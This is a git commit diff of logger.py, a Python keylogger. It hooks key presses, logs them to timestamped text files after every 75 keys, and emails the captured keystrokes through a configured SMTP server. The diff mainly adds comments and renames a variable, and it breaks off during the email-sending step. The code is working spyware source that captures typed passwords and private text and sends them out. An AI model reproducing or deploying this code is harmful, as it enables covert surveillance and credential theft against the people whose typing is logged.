a7c3c2beba10482cfe345fd220e578798783ae0c
EthanB87 <ethan@brockmanfamily.ca>
2024-04-02 21:59:58 -0400

    Initial Commit

--- logger.py
+++ logger.py
@@ -7,37 +7,50 @@ from email.mime.multipart import MIMEMultipart
 import logging
 import configparser
 
+# Globals variables
 keystrokes = []
 LOG_FILE = "keylog.log"
-logfile = ""
+TXT_FILE = ""
 
+# Configure logging settings
 logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG)
 
 
+# Event handler function for the key presses
 def on_press(keypress):
     global keystrokes
+    # Append the pressed key to the keystrokes list
     keystrokes.append(keypress)
 
+    # Check if the number of keystrokes has reached the limi
     if len(keystrokes) >= 75:
         write_to_file()
         send_email()
 
 
+# Write the logged keystrokes to a file with a timestamp after 75 characters logged
 def write_to_file():
     global keystrokes
-    global logfile
+    global TXT_FILE
 
+    # Check if the number of keystrokes has reached the limit
     if len(keystrokes) >= 75:
-        if not logfile or os.path.getsize(logfile) >= 75:
-            logfile = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
+        # Check if a new log file needs to be created
+        if not TXT_FILE or os.path.getsize(TXT_FILE) >= 75:
+            # Create a new log file with a timestamp
+            TXT_FILE = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
 
-    with open(logfile, "a") as file:
+    # Write the keystrokes to the log file
+    with open(TXT_FILE, "a") as file:
         for key in keystrokes:
             file.write(str(key) + "\n")
+    # Clear the keystroke list
     keystrokes = []
 
 
+# Send create and send an email containing the created file to a specified address
 def send_email():
+    # Read email configuration from config.ini
     config = configparser.ConfigParser()
     config.read('config.ini')
     from_addr = config['EMAIL']['Username']
@@ -46,17 +59,21 @@ def send_email():
     smtp_server = config['SMTP']['Server']
     smtp_port = int(config['SMTP']['Port'])
 
+    # Create email message content
     msg = MIMEMultipart()
     msg['From'] = from_addr
     msg['To'] = to_addr
     msg['Subject'] = 'Keylog'
 
-    with open(logfile, "r") as file:
+    # Read keystrokes from log file
+    with open(TXT_FILE, "r") as file:
         body = file.readlines()
 
+    # Attach keystrokes to email
     msg.attach(MIMEText("".join(body), 'plain'))
 
     try:
+        # Connect to SMTP server and send email
         server = smtplib.SMTP(smtp_server, smtp_port)
         server.starttls()
         server.login(from_addr, password)
